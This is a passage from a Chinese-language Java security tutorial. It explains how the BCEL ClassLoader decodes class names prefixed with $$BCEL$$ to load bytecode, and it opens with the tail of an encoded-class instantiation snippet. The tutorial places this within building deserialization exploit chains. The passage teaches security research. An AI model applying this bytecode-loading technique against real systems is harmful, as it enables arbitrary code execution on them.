f$84$a2$C$A$A").newInstance();  
 }  
}
```

那么为什么要在前面加上 `$$BCEL$$` 呢？这里引用一下p神的解释

> BCEL 这个包中有个有趣的类`com.sun.org.apache.bcel.internal.util.ClassLoader`，他是一个 ClassLoader，但是他重写了 Java 内置的`ClassLoader#loadClass()`方法。
>
> 在 `ClassLoader#loadClass()` 中，其会判断类名是否是 `$$BCEL$$` 开头，如果是的话，将会对这个字符串进行 decode

## 0x05 关于字节码的小结

- 首先我们要知道字节码与安全有什么关系，不是照着敲几行代码，看到弹出计算器就是可以的了，我们需要去分析原因，不然和安全研究没有半毛钱关系。

我们要最终达到的目的其实是加载 class 文件，也就是字节码文件。所以我们所做的一系列工作都是为了能够调用这些 class，只有完成了这一步，才能继续我们的链子。